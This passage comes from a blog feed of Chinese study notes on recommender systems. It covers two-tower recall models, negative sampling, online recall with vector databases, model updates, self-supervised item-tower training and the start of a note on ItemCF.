src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_yS33GbQ6TB.png"></p><p>这里在进入神经网络之前直接把两个向量拼接起来，属于<strong>前期融合</strong>。这种网络架构和双塔结构有很大的区别，双塔模型中两个塔只有在最后输出相似度的时候才融合起来。</p><p>这种前期融合的模型不适合于召回，因为需要把用户和所有物品的向量都要拼接起来送入神经网络，时间复杂度较高。</p><p>这种模型通常用于<strong>排序</strong>，从几千个候选物品中选出几百个，计算量不会很大。</p><hr><h1 id="2-正负样本"><a href="#2-正负样本" class="headerlink" title="2 正负样本"></a>2 正负样本</h1><p>由于双塔模型需要用到正负样本，所以选对正负样本对模型最终的效果至关重要。</p><h2 id="2-1-正样本"><a href="#2-1-正样本" class="headerlink" title="2.1 正样本"></a>2.1 正样本</h2><p>正样本的选择可以是曝光而且有点击的⽤户—物品⼆元组（⽤户对物品感兴趣）。但是往往正样本都是一些热门物品，导致正样本被点击的次数很多，即少部分物品占据大部分点击。</p><p><strong>解决方法：</strong>过采样冷门物品，或降采样热门物品。</p><ol><li><strong>过采样（up-sampling）：</strong>⼀个样本出现多次</li><li><strong>降采样（down-sampling）：</strong>⼀些样本被抛弃</li></ol><h2 id="2-2-负样本"><a href="#2-2-负样本" class="headerlink" title="2.2 负样本"></a>2.2 负样本</h2><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_U7RIyfahBE.png"></p><p>负样本就是用户不感兴趣的物品，也就是推荐系统链路上被淘汰的物品。</p><h3 id="2-2-1-简单负样本：全体物品"><a href="#2-2-1-简单负样本：全体物品" class="headerlink" title="2.2.1 简单负样本：全体物品"></a>2.2.1 简单负样本：全体物品</h3><p>未被召回的物品，大概率是用户不感兴趣的，所以未被召回的物品 ≈ 全体物品。因此直接从全体物品中做抽样，作为负样本。</p><p>问题是怎么做抽样，是均匀抽样还是非均匀抽样。</p><blockquote><p>均匀抽样：对冷门物品不公平</p></blockquote><p>因为正样本大多是热门物品，如果均匀抽样产⽣负样本，负样本⼤多是冷门物品。总拿热门物品做正样本，冷门物品做负样本，对冷门物品会不公平，这样会让热门物品更热，冷门物品更冷。</p><blockquote><p>非均抽采样：目的是打压热门物品</p></blockquote><p>所以应当采用随机非均匀抽样，这样可以打压热门物品抽样的概率与热门程度正相关，热门物品成为负样本的概率大。负样本抽样概率与热门程度（点击次数）正相关。物品的热门程度可以用它的点击次数来衡量，可以按以下方法做抽样，0.75 是个经验值：</p><p>$$<br>抽样概率 \propto(\text { 点击次数 })^{0.75}<br>$$</p><p>上面介绍的简单负样本是从全体物品中抽样的。</p><h3 id="2-2-2-简单负样本：Batch内负样本"><a href="#2-2-2-简单负样本：Batch内负样本" class="headerlink" title="2.2.2 简单负样本：Batch内负样本"></a>2.2.2 简单负样本：Batch内负样本</h3><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_gEi7DArtL1.png"></p><p>在所曝光的物品中，用户点击了的记为正样本，未点击的记为负样本，⼀个 <code>batch</code> 内有 $n$ 个正样本。⼀个用户和 $n-1$ 个物品组成负样本，则这个 <code>batch</code> 内一共有 $n(n-1)$ 个负样本。但是这些都是是简单负样本，因为第⼀个用户不喜欢第二个物品。</p><p>一个物品出现在 <code>batch</code> 内的概率 ∝ 点击次数。但是物品成为负样本的概率本该是 $\propto(\text { 点击次数 })^{0.75}$，但在这里是 ∝ 点击次数。导致热门物品成为负样本的概率过大。</p><p>作训练的时候调整为如下公式，线上测试的时候不用调整。</p><p>$$<br>\cos \left(\mathrm{a}, {b}_{i}\right)-\log p_{i}<br>$$</p><h3 id="2-2-3-困难负样本"><a href="#2-2-3-困难负样本" class="headerlink" title="2.2.3 困难负样本"></a>2.2.3 困难负样本</h3><p>困难负样本主要有以下两种：</p><ul><li>被粗排淘汰的物品（比较困难）</li><li>精排分数靠后的物品（非常困难）</li></ul><p>困难负样本是指粗排被淘汰的物品，为什么被排序淘汰的物品被称为负样本呢？</p><p>因为这些物品被召回，说明和用户的兴趣有点关系，但是粗排被淘汰，说明用户对这些物品的兴趣不够强，所以被分为负样本。对正负样本做二分分类的时候，这些物品容易被分为正样本，容易被分错。</p><p>更困难的负样本是通过了粗排，但是在精排中分数排名靠后的物品。</p><p>所以在对正负样本做二元分类：</p><ol><li>全体物品（简单）分类准确率高</li><li>被粗排淘汰的物品（比较困难）容易分错</li><li>精排分数靠后的物品（非常困难）更容易分错</li></ol><p>在训练的时候混合几种负样本，50%的负样本是全体物品（简单负样本），50%的负样本是没通过排序的物品（困难负样本）。</p><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_QgB1fbK-Pg.png"></p><p>注意，曝光但是没有点击的物品，在训练<strong>召回</strong>模型不能用这类负样本，训练<strong>排序</strong>模型会用这类负样本。</p><h3 id="2-2-4-选择负样本的原理"><a href="#2-2-4-选择负样本的原理" class="headerlink" title="2.2.4 选择负样本的原理"></a>2.2.4 选择负样本的原理</h3><p><strong>召回的目标</strong>是快速找到用户可能感兴趣的物品，<strong>排序的目标</strong>是选择用户最感兴趣的物品。</p><ul><li>全体物品（easy）：绝⼤多数是⽤户根本不感兴趣的</li><li>被排序淘汰（hard）：⽤户可能感兴趣，但是不够感兴趣</li><li>有曝光没点击（没⽤）：⽤户感兴趣，可能碰巧没有点击</li></ul><hr><h1 id="3-线上工作过程"><a href="#3-线上工作过程" class="headerlink" title="3 线上工作过程"></a>3 线上工作过程</h1><p>主要分为两部分：离线存储和线上召回。</p><p><strong>离线存储：</strong>把物品向量 $b$ 存⼊向量数据库。</p><ol><li>完成训练之后，用物品塔计算每个物品的特征向量 $b$</li><li>把几亿个物品向量 $b$，存入向量数据库（⽐如 Milvus、Faiss、HnswLib）</li><li>向量数据库建索引，以便加速最近邻查找</li></ol><p><strong>线上召回：</strong>查找用户最感兴趣的 $k$ 个物品。</p><ol><li>给定用户 ID 和画像，线上用神经网络算用户向量 $a$</li><li>最近邻查找：把向量 $a$ 作为 query，调用向量数据库做最近邻查找，之后返回余弦相似度最大的 $k$ 个物品，作为召回结果</li></ol><h2 id="3-1-离线存储"><a href="#3-1-离线存储" class="headerlink" title="3.1 离线存储"></a>3.1 离线存储</h2><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_V8P2cHLjGj.png"></p><p>训练得到两个塔之后，就可以做线上召回，把物品 ID 送入神经网络之后，得到特征 $b$，并把 $\langle 特征向量 $b$, 物品 ID \rangle$ 保存到向量数据库中。</p><h2 id="3-2-线上召回"><a href="#3-2-线上召回" class="headerlink" title="3.2 线上召回"></a>3.2 线上召回</h2><p>对于用户塔来说，不用事先计算和存储用户向量，而是等用户发起推荐请求的时候，调用神经网络在线上实时计算一个特征向量 $a$，然后把向量 $a$ 作为 $query$ 去数据库中做检索，查找最近邻。</p><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_gUOKDq37Aa.png"></p><h2 id="3-3-模型更新"><a href="#3-3-模型更新" class="headerlink" title="3.3 模型更新"></a>3.3 模型更新</h2><p><strong>全量更新：</strong>今天凌晨，用昨天全天的数据训练模型。是在昨天模型参数的基础上做训练，而不是随机初始化。</p><p>用昨天的数据训练 1 epoch，即每天数据只用⼀遍。之后发布新的用户塔神经网络和物品向量，供线上召回使用。全量更新对数据流、系统的要求比较低。</p><p><strong>增量更新：</strong>做 online learning 更新模型参数。</p><p>由于用户兴趣会随时发生变化，所以实时收集线上数据做流式处理，生成 TFRecord 文件。即对模型做 online learning，增量更新 ID Embedding 参数（不更新神经网络其他部分的参数）。之后发布 ID Embedding，供⽤户塔在线上计算用户向量。</p><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_ru4lvg1Vql.png"></p><blockquote><p>问题：能否只做增量更新，不做全量更新？</p></blockquote><p>由于小时级数据有偏，并且分钟级数据偏差更大，所以不能只做增量更新。</p><ul><li><strong>全量更新：</strong>random shuffle ⼀天的数据，做 1 epoch 训练</li><li><strong>增量更新：</strong>按照数据从早到晚的顺序，做 1 epoch 训练</li></ul><p>随机打乱优于按顺序排列数据，所以全量训练优于增量训练。</p><hr><h1 id="4-自监督学习改进双塔模型"><a href="#4-自监督学习改进双塔模型" class="headerlink" title="4 自监督学习改进双塔模型"></a>4 自监督学习改进双塔模型</h1><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_qebXNapf8n.png"></p><p>双塔模型整体分为两个塔：用户塔和物品塔，之后将两个塔输出的向量做余弦相似度的计算，得到用户 $a$ 对物品 $b$ 的感兴趣的分数。</p><p><strong>双塔模型的问题：</strong></p><ol><li><strong>推荐系统的头部效应严重：</strong>少部分物品占据大部分点击，大部分物品的点击次数不高。</li><li>高点击物品的表征学得好，长尾物品的表征学得不好。</li></ol><p><strong>解决方法：</strong>可以使用自监督学习，即做 data augmentation，更好地学习长尾物品的向量表征。</p><h2 id="4-1-使用自监督学习训练物品塔"><a href="#4-1-使用自监督学习训练物品塔" class="headerlink" title="4.1 使用自监督学习训练物品塔"></a>4.1 使用自监督学习训练物品塔</h2><p>现在有两个物品 $i$ 和 $j$，对它们做不同的特征变换分别得到 $i’$、$i’’$ 和 $j’$、$j’’$。把这些特征输入物品塔，下面四个物品塔使用相同的参数。由于使用的特征变换不同，所以通过相同的物品塔得到的 $b^{\prime}_i$ 和 $b^{\prime }_i$不相同，但是两个向量是对同一个物品的表征，所以应该有比较高的相似度。</p><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_XFJs4yQc2v.png"></p><p>但是不同物品的表征应该距离比较远，不相似。</p><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_AINx1vDQ7i.png"></p><p>物品 $i$ 的两个向量表征 $b^{\prime}_i$ 和 $b^{\prime \prime}_i$ 有较高的相似度，物品 $i$ 和 $j$ 的两个向量表征 $b^{\prime}_i$ 和 $b^{\prime \prime}_j$ 有较低的相似度，所以鼓励 $\cos \left({b}_{i}^{\prime}, {b}_{i}^{\prime \prime}\right)$ 尽量大，$\cos \left({b}_{i}^{\prime}, {b}_{j}^{\prime \prime}\right)$ 尽量小。</p><h2 id="4-2-特征变换方式"><a href="#4-2-特征变换方式" class="headerlink" title="4.2 特征变换方式"></a>4.2 特征变换方式</h2><h3 id="4-2-1-Random-Mask"><a href="#4-2-1-Random-Mask" class="headerlink" title="4.2.1 Random Mask"></a>4.2.1 Random Mask</h3><p>随机选⼀些离散特征（⽐如类⽬），把它们遮住。例如：某物品的类⽬特征是 $\mathcal{U} &#x3D; \{数码,摄影\}$，Mask 后的类⽬特征是 $\mathcal{U}^{\prime}&#x3D;\{ default \}$。</p><p>相当于 Mask 之后该物品的类目特征就没有了。</p><h3 id="4-2-2-Dropout"><a href="#4-2-2-Dropout" class="headerlink" title="4.2.2 Dropout"></a>4.2.2 Dropout</h3><p>⼀个物品可以有多个类⽬，那么类⽬是⼀个多值离散特征。Dropout 是指随机丢弃特征中 50% 的值，只对多值离散特征生效。</p><p>例如：某物品的类⽬特征是 $\mathcal{U} &#x3D; \{美妆,摄影\}$，Mask 后的类⽬特征是 $\mathcal{U}^{\prime}&#x3D;\{ 美妆\}$。</p><blockquote><p>注意：Random Mask 是把整个类目信息全部丢掉，但是 Dropout 是丢失一部分信息</p></blockquote><h3 id="4-2-3-互补特征（complementary）"><a href="#4-2-3-互补特征（complementary）" class="headerlink" title="4.2.3 互补特征（complementary）"></a>4.2.3 互补特征（complementary）</h3><p>假设物品⼀共有 4 种特征：ID，类⽬，关键词，城市，将其随机分为两组：</p><p>$$<br>\{ ID，关键词 \} 和 \{ 类目，城市 \}<br>$$</p><p>之后分别将其中某一组给 mask 掉，送入物品塔，得到不同的物品表征，则希望输出的两个向量相似。</p><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_1hrYpHDGH8.png"></p><h3 id="4-2-4-Mask-一组关联的特征"><a href="#4-2-4-Mask-一组关联的特征" class="headerlink" title="4.2.4 Mask 一组关联的特征"></a>4.2.4 Mask 一组关联的特征</h3><p>把一组相关的特征中只保留一个特征，例如：</p><ul><li>受众性别：$\mathcal{U}&#x3D;\{ 男, 女, 中性 \}$</li><li>类目：$\mathcal{V}&#x3D;\{ 美妆，数码，足球，摄影，科技， \cdots\}$</li></ul><p>则 $u &#x3D; 女$ 和 $v &#x3D; 美妆$ 同时出现的概率 $p(u, v)$ 大，而 $u &#x3D; 女$ 和 $v &#x3D; 数码$ 同时出现的概率 $p(u, v)$ 小。</p><p>离线计算特征两两之间的关联，用互信息（mutual information）衡量：</p><p>$$<br>\operatorname{MI}(\mathcal{U}, \mathcal{V})&#x3D;\sum_{u \in \mathcal{u}} \sum_{v \in \mathcal{v}} p(u, v) \cdot \log \frac{p(u, v)}{p(u) \cdot p(v)}<br>$$</p><p>具体工作过程如下：设⼀共有 $k$ 种特征。离线计算特征两两之间 MI，得到 $k \times k$ 的矩阵。随机选一个特征作为种子，找到种子最相关的 $k&#x2F;2$ 种特征，Mask 种子及其相关的 $k &#x2F; 2$ 种特征，保留其余 $k&#x2F;2$ 种特征。</p><ul><li><strong>优点：</strong>比 random mask、dropout、互补特征等方法效果更好。</li><li><strong>缺点：</strong>方法复杂，实现的难度⼤，不容易维护。</li></ul><h2 id="4-3-模型训练"><a href="#4-3-模型训练" class="headerlink" title="4.3 模型训练"></a>4.3 模型训练</h2><p>首先从从全体物品中均匀抽样，得到 $m$ 个物品，作为⼀个 batch。双塔模型是根据用户点击量进行抽样的，而这里是进行随机抽样，热门和冷门物品被抽到的概率相同。</p><p>之后做两类特征变换，物品塔输出两组向量：</p><p>$$<br>\mathbf{b}_{1}^{\prime}, \mathbf{b}_{2}^{\prime}, \cdots, \mathbf{b}_{m}^{\prime} \quad 和 \quad \mathbf{b}_{1}^{\prime \prime}, \mathbf{b}_{2}^{\prime \prime}, \cdots, \mathbf{b}_{m}^{\prime \prime}<br>$$</p><p>其中第 $i$ 个物品自监督学习的损失函数为：</p><p>$$<br>L_{\text {self }}[i]&#x3D;-\log \left(\frac{\exp \left(\cos \left(\mathbf{b}_{i}^{\prime}, \mathbf{b}_{i}^{\prime \prime}\right)\right)}{\sum_{j&#x3D;1}^{m} \exp \left(\cos \left(\mathbf{b}_{i}^{\prime}, \mathbf{b}_{j}^{\prime \prime}\right)\right)}\right)<br>$$</p><p>具体推导如下图，只有第 $i$ 个物品的 $b^{\prime}_i$ 和 $b^{\prime \prime}_i$ 是相似的，而 $b^{\prime}_i$ 和其他剩下的 $m-1$ 个物品是不相似的。</p><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_sf7IXvC8Ep.png"></p><p>之后做梯度下降，减小自监督学习的损失：</p><p>$$<br>\frac{1}{m} \sum_{i&#x3D;1}^{m} L_{\text {self }}[i]<br>$$</p><h2 id="4-4-总结"><a href="#4-4-总结" class="headerlink" title="4.4 总结"></a>4.4 总结</h2><p>由于双塔模型学不好低曝光物品的向量表征，提出自监督学习来改善这种状况：</p><ol><li>对物品做随机特征变换</li><li>特征向量 $b^{\prime}_i$ 和 $b^{\prime \prime}_i$ 相似度高（相同物品）</li><li>特征向量 $b^{\prime}_i$ 和 $b^{\prime \prime}_j$ 相似度低（不同物品）</li></ol><p><strong>实验效果：</strong>低曝光物品、新物品的推荐变得更准。</p><p>使用自监督学习的双塔模型训练损失函数如下：</p><p>$$<br>\frac{1}{n} \sum_{i&#x3D;1}^{n} L_{\text {main }}[i]+\alpha \cdot \frac{1}{m} \sum_{j&#x3D;1}^{m} L_{\text {self }}[j]<br>$$</p><p>第一项是双塔模型的损失，第二项是自监督学习的损失，其中 $\alpha$ 是控制自监督学习力度的超参数。</p>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSS推荐系统学习笔记2：召回1</title>
      <link href="/2024/10/10/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9A%E5%8F%AC%E5%9B%9E1/"/>
      <url>/2024/10/10/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9A%E5%8F%AC%E5%9B%9E1/</url>
      
        <content type="html"><![CDATA[<h1>1 基于物品的协同过滤ItemCF</h1><h2 id="1-1-itemcf的原理">1.1 ItemCF的原理</h2><p><img src="image_JSfOuoA4D3.png" alt=""></p><p>推荐系统如何知道《笑傲江湖》与《鹿鼎记》相似？</p><ol><li>看过《笑傲江湖》的用户也看过《⿅⿍记》</li><li>给《笑傲江湖》好评的用户也给《⿅⿍记》好评</li></ol><h2 id="1-2-itemcf的实现">1.2 ItemCF的实现</h2><p><img src="image_PpDTNAaz9C.png" alt=""></p><p>预估用户对候选物品的兴趣：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><munder><mo>∑</mo><mi>j</mi></munder><mi mathvariant="normal">like</mi><mo>⁡</mo><mo fence="true">(</mo><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo separator="true">,</mo><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi><mrow><msub><mrow></mrow><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>×</mo><mi mathvariant="normal">sim</mi><mo>⁡</mo><mo fence="true">(</mo><mi>i</mi><mi>t</mi><mi>e</mi><msub><mi>m</mi><mi>j</mi></msub><mo separator="true">,</mo><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sum_{j} \operatorname{like}\left(\right. user, item \left._{j}\right) \times \operatorname{sim}\left(\right. item _{j}, item )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.463782em;vertical-align:-1.413777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8723309999999997em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.413777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">l</span><span class="mord mathrm">i</span><span class="mord mathrm">k</span><span class="mord mathrm">e</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen nulldelimiter"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mop"><span class="mord mathrm">s</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span></span></p><blockquote><p>左边是用户对物品的兴趣，右边是两个物品之间的相似度</p></blockquote><p>根据上面的公式进行计算即可得到：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>×</mo><mn>0.1</mn><mo>+</mo><mn>1</mn><mo>×</mo><mn>0.4</mn><mo>+</mo><mn>4</mn><mo>×</mo><mn>0.2</mn><mo>+</mo><mn>3</mn><mo>×</mo><mn>0.6</mn><mo>=</mo><mn>3.2</mn></mrow><annotation encoding="application/x-tex">2 \times 0.1+1 \times 0.4+4 \times 0.2+3 \times 0.6=3.2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">.</span><span class="mord">2</span></span></span></span></span></p><p>表示用户对候选物品的兴趣，比如有多个候选物品，则可以计算用户对每一个物品的候选分数，然后选出分数较高的几个物品。</p><h2 id="1-3-物品的相似度">1.3 物品的相似度</h2><p>两个物品的受众重合度越⾼，两个物品越相似。例如，喜欢《射雕英雄传》和《神雕侠侣》的读者重合度很⾼，则可以认为《射雕英雄传》和《神雕侠侣》相似。</p><blockquote><p>两个物品不相似：红色物品和绿色物品的用户之间没有交集</p></blockquote><p><img src="image_JUdf5r8sIG.png" alt=""></p><blockquote><p>两个物品相似：红色物品和绿色物品的用户之间有交集</p></blockquote><p><img src="image_X-nZu9_nl1.png" alt=""></p><p>喜欢物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">i_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的用户记作集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">W</mi><mi mathvariant="normal">_</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">\mathcal{W}\_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">W</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span></span></span></span> ，喜欢物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">i_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的用户记作集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">W</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{W}_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">W</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord 